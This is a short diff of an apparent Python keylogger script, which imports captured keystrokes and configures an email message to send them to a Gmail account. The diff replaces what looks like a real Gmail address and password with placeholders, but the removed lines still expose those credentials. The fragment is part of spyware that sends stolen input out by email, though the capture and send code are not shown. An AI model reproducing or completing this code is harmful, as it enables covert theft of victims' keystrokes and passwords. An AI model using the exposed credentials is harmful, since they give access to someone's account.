@@ -10,9 +10,9 @@ from email import encoders
 from keylogger_sub import keystrokes
 
 #generic email stuff
-email_user = 'aguitarplayer42@gmail.com'
-email_password = 'C0mputerm@n'
-email_send = 'aguitarplayer42@gmail.com'
+email_user = 'email@gmail.com'
+email_password = 'password'
+email_send = 'email@gmail.com'
 subject = 'subject'
 
 msg = MIMEMultipart()
